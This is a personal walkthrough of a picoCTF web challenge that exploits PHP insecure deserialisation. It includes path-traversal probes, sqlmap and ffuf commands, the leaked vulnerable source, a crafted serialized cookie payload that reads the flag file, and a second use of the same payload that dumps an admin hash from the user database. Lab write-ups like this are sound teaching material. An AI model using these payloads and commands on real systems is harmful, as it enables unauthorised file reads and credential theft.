With the combination of the PHPSESSID which is included in the login request + the name of the challenge I think it is likely that it has to do with the [serialize()](https://www.php.net/manual/en/function.serialize.php) php function

Going to _/.htaccess_ I came to a page with the same login, but with a white background. I am afraid this will be one of the confusing and tedious ones where you have to unnest the website.

There's an error of sorts: ![[Screenshot 2022-05-30 at 10.21.06.png]]
Looking at this screenshot, there is something about the number of _index.php_'s --> after 2x it appears anything on the end is ignored and I could insert URLs such as `http://mercury.picoctf.net:2148/index.php/index.php/yolo` without an error being raised..


Trying to request _/../flag_ returned an error 404, but requesting index.php/../flag a 200 --> still no flag in sight..
![[Screenshot 2022-05-30 at 10.42.32.png]]
![[Screenshot 2022-05-30 at 10.43.00.png]]
^ notice the referer header


_'THe PHPSESSID value you see, is just an MD5 identifier of session file assigned to current browser session.'_

THOUGHTS
- "documents must have a title"
- decode phpsessid
- session-fixation attack
- ../flag + .htaccess returns 404 not found..


I believe it is an sqli + lfi vulnerability, I am simply trying to find an entrypoint..
NEXT
===
Do: `sqlmap -u "mercury.picoctf.net:2148/index.php/" --method=POST --level=5 -risk=3 --threads=10 --cookie="PHPSESSID=ojb9be9jfrqtqv0rvs39ctjrsv" -p username`
![[Screenshot 2022-05-30 at 12.38.32.png]]
--> Off-by-slash
--> alias-lfi misconfig


doing /index.php/../style.css showed the style page, meaning there is definitely lfi going on

sanitizer.js:
`const DATA_URL_PATTERN = /^data:(?:image\/(?:bmp|gif|jpeg|jpg|png|tiff|webp)|video\/(?:mpeg|mp4|ogg|webm)|audio\/(?:mp3|oga|ogg|opus));base64,[a-z0-9+/]+=*$/i`


Progress
===
Navigating to `http://mercury.picoctf.net:2148//..%2f/flag` having used `%2e%2e%2f` in place of `../` we no longer got a _404 not found_ error but a _forbidden_ --> this is where I believe the PHPSESSID comes in! 
`http://mercury.picoctf.net:2148/..%2f/..%2f/..%2f/etc/passwd` shows th same error, so now we know where to find the files, and that we cannot r ead them due to the phpsessid. It appears the sanitisation did not allow for simply _.._ or _%2e_ but _..%2f_ works.

ARIA_ATTRIBUTE_PATTERN is in use --> has to do with accessing the directory tree

THOUGHTS
- sqli to get user credentials
- log in with valid + use stolen PHPSESSID to access forbidden page
- try uplaoding a file and then find it?



BREAKING POINT
===
Looking at a CTFTime writeup, I learned something I did not know: the _robots.txt_ which showed the _admin.phps_ file existed, meant that other _.phps_ files would also be available --> i.e. _/index.phps_:

the error message of _/index.phps_:
```
is_guest() || $perm_res->is_admin()) { setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/"); header("Location: authentication.php"); die(); } else { $msg = '
Invalid Login.
'; } } ?> 
```
From what I can understand, it runs a function which sets a cookie _login_ which is serialised, before base64 encoded and finally url encoded. It also appears the admin will be redirected to authentication.php - so if we try to access this by going to _/authentication.phps_:
```
log_file = $lf; } function __toString() { return $this->read_log(); } function append_to_log($data) { file_put_contents($this->log_file, $data, FILE_APPEND); } function read_log() { return file_get_contents($this->log_file); } } require_once("cookie.php"); if(isset($perm) && $perm->is_admin()){ $msg = "Welcome admin"; $log = new access_log("access.log"); $log->append_to_log("Logged in at ".date("Y-m-d")."\n"); } else { $msg = "Welcome guest"; } ?>

```
So there's a _cookie.php_ file, and some log file _access.log_
Contents of _cookie.phps_:
```
username = $u; $this->password = $p; } function __toString() { return $u.$p; } function is_guest() { $guest = false; $con = new SQLite3("../users.db"); $username = $this->username; $password = $this->password; $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?"); $stm->bindValue(1, $username, SQLITE3_TEXT); $stm->bindValue(2, $password, SQLITE3_TEXT); $res = $stm->execute(); $rest = $res->fetchArray(); if($rest["username"]) { if ($rest["admin"] != 1) { $guest = true; } } return $guest; } function is_admin() { $admin = false; $con = new SQLite3("../users.db"); $username = $this->username; $password = $this->password; $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?"); $stm->bindValue(1, $username, SQLITE3_TEXT); $stm->bindValue(2, $password, SQLITE3_TEXT); $res = $stm->execute(); $rest = $res->fetchArray(); if($rest["username"]) { if ($rest["admin"] == 1) { $admin = true; } } return $admin; } } if(isset($_COOKIE["login"])){ try{ $perm = unserialize(base64_decode(urldecode($_COOKIE["login"]))); $g = $perm->is_guest(); $a = $perm->is_admin(); } catch(Error $e){ die("Deserialization error. ".$perm); } } ?> 
```
So database is _sqlite3_, parameters are u and p --> maybe we can do an sqlmap db dump?
_../users.db_ --> doubt we can access it but worth trying. Looks like the cookie value is "login"


Trying some password fuzzing `ffuf -w ../../../tools/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -X POST -d "u=admin&p=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u  http://mercury.picoctf.net:2148/index.php -mr 'Welcome admin'` did not work, but I also dont think its supposed to.

As thought of earlier, there is indeed PHPSESSID manipulation required, but the method was not what I expected:


METHOD
===
setting a new cookie _login_ to *whatever* leads to the deserialisation error. Hence, this is the one we can manipulate, NOT the PHPSESSID..
Using the serialisation format of php to build the 'cookie' using [this guide](https://en.wikipedia.org/wiki/PHP_serialization_format) and [this]():
O:lengthOfObjName:"className":numOfPropertiesInClass:{properties}. This can be automated using the following php code:
```
class access_log
{
    public $log_file;

    function __construct($lf) {
        $this->log_file = $lf;
    }

    function __toString() {
        return $this->read_log();
    }

    function append_to_log($data) {
        file_put_contents($this->log_file, $data, FILE_APPEND);
    }

    function read_log() {
        return file_get_contents($this->log_file);
    }
}
echo serialize(new access_log("../flag"))
```
**NOTICE how I included the access_log class which could be found using `curl "http://mercury.picoctf.net:2148/authentication.phps"`**
Now, taking the serialised string and urlencoding it after base64 encoding it we get:
`O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}` --> `TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9` before exceuting `document.cookie="login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9"` we get the flag:
**_picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_8db8f85c}_**


Takeaways:
- try the extensions you find in robot.txt
- its normally not the pre-generated cookie which needs manipulation but other defined + hidden ones
- loging not always required..


FURTHER
===
using the same method but for _../users.db_ instead of _../flag_ I got the credentials _admin_:_8e06b9938d87364f874739448363142_ --> but they did not work and I could not crack the hash..